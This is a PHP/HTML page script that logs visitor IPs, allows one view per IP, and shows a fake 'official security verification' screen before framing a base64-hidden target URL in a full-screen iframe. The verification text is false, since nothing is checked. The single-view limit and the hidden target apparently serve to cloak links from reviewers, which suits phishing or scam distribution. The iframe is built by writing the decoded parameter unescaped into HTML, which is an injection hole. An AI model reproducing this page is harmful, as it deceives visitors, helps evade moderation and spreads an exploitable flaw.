<?php
// 1. 核心配置
$IP_LOG_FILE = 'ip.log'; // IP日志文件路径
$ACCESS_KEY = 'has_accessed'; // 本地存储标记（辅助避免重复加载）

// 2. 获取用户真实公网IP
function get_user_real_ip() {
    $ip = '';
    // 优先获取代理转发的真实IP（适配CDN、反向代理场景）
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        $ip = $_SERVER['HTTP_X_REAL_IP'];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    // 处理多IP情况（如多个代理，取第一个有效IP）
    if (strpos($ip, ',') !== false) {
        $ip = trim(explode(',', $ip)[0]);
    }
    return $ip;
}

// 3. 初始化IP日志文件（不存在则自动创建）
if (!file_exists($IP_LOG_FILE)) {
    $file = fopen($IP_LOG_FILE, 'w');
    fclose($file);
    // 赋予写入权限（部分服务器需手动设置755权限）
    chmod($IP_LOG_FILE, 0644);
}

// 4. 校验IP访问权限
$user_ip = get_user_real_ip();
$logged_ips = file($IP_LOG_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); // 读取已记录IP
$has_access = !in_array($user_ip, $logged_ips); // 判断是否有权限

// 5. 首次访问：记录IP
if ($has_access && !isset($_GET['skip_log'])) {
    file_put_contents($IP_LOG_FILE, $user_ip . "\n", FILE_APPEND); // 追加IP到日志
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport">
    <meta content="yes" name="apple-mobile-web-app-capable">
    <meta content="yes" name="apple-touch-fullscreen">
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <meta content="320" name="MobileOptimized">
    <title>官方认证-安全访问</title>
    <style>
        /* 加载容器样式 */
        .loading-container {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            background-color: #f8f9fa;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        /* 安全访问文字样式 */
        .security-text {
            font-size: 24px;
            color: #28a745; /* 安全绿 */
            font-weight: bold;
            letter-spacing: 1px;
            margin-bottom: 20px;
        }
        /* 安全图标样式 */
        .security-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background-color: #28a745;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 30px;
            margin-bottom: 15px;
        }
        /* 加载提示文字 */
        .loading-tip {
            color: #6c757d;
            font-size: 14px;
        }
        /* iframe容器样式 */
        .content {
            height: 100%;
            width: 100%;
            position: fixed;
            left: -2px;
            top: -2px;
        }
        /* 无权访问样式 */
        .forbidden-container {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            background-color: #f8f9fa;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .forbidden-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background-color: #dc3545; /* 错误红 */
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 30px;
            margin-bottom: 15px;
        }
        .forbidden-text {
            font-size: 24px;
            color: #333;
            font-weight: bold;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <!-- 加载容器 -->
    <div class="loading-container" id="loadingContainer">
        <div class="security-icon">✓</div>
        <div class="security-text">官方安全验证</div>
        <div class="loading-tip">正在进行身份认证与安全协议验证，请稍候...</div>
    </div>
    <!-- 无权访问容器（默认隐藏） -->
    <div class="forbidden-container" id="forbiddenContainer" style="display: none;">
        <div class="forbidden-icon">✕</div>
        <div class="forbidden-text">你已无权查看</div>
        <div class="loading-tip">每个IP仅能访问一次</div>
    </div>

    <script>
        // 从PHP获取权限状态（服务器端传递给前端）
        const hasAccess = <?php echo $has_access ? 'true' : 'false'; ?>;
        
        // 核心逻辑：权限判断+内容加载
        (function() {
            const loadingContainer = document.getElementById('loadingContainer');
            const forbiddenContainer = document.getElementById('forbiddenContainer');

            // 无权限：显示禁止界面
            if (!hasAccess) {
                loadingContainer.style.display = 'none';
                forbiddenContainer.style.display = 'flex';
                return;
            }

            // 有权限：解析目标地址
            const urlParams = new URLSearchParams(window.location.search);
            const encodedParam = urlParams.get('c');
            if (!encodedParam) {
                document.querySelector('.loading-tip').textContent = '参数错误：缺少目标地址';
                return;
            }

            try {
                const tureurl = atob(encodedParam);
                if (tureurl.includes('http')) {
                    // 隐藏加载动画，插入iframe
                    loadingContainer.style.display = 'none';
                    const html = `<iframe class="content" onload="bindMouseWhee(this)" src="${tureurl}"></iframe>`;
                    document.writeln(html);
                    console.log('目标地址：', tureurl);
                } else {
                    document.querySelector('.loading-tip').textContent = '参数错误：目标地址无效';
                }
            } catch (e) {
                document.querySelector('.loading-tip').textContent = '参数错误：地址解码失败';
                console.error('解码错误：', e);
            }
        })();

        // 鼠标滚轮事件处理（保留原有逻辑）
        const firefox = navigator.userAgent.indexOf('Firefox') !== -1;
        function MouseWheel(e, doc) {
            try {
                e.preventDefault && e.preventDefault();
                e.returnValue = false;
                const up = firefox && e.detail < 0 || e.wheelDelta > 0;
                doc.body.scrollTop = doc.documentElement.scrollTop += up ? -50 : 50;
            } catch (e) {
                console.log('跨域环境下无法控制滚动：', e);
            }
        }
        function bindMouseWhee(ifr) {
            try {
                let isSameOrigin = false;
                try {
                    const iframeOrigin = new URL(ifr.src).origin;
                    isSameOrigin = window.location.origin === iframeOrigin;
                } catch (e) {
                    console.log('无法验证同源性：', e);
                }
                if (isSameOrigin) {
                    const doc = ifr.contentWindow.document;
                    if (firefox) {
                        doc.addEventListener('DOMMouseScroll', (e) => MouseWheel(e, doc), false);
                    } else {
                        doc.onmousewheel = (e) => MouseWheel(e || ifr.contentWindow.event, doc);
                    }
                } else {
                    console.log('检测到跨域iframe，不绑定滚动事件');
                }
            } catch (e) {
                console.log('绑定滚动事件失败：', e);
            }
        }
    </script>
    <script type="text/javascript" src="https://js.users.51.la/21480123.js"></script>
</body>
</html>
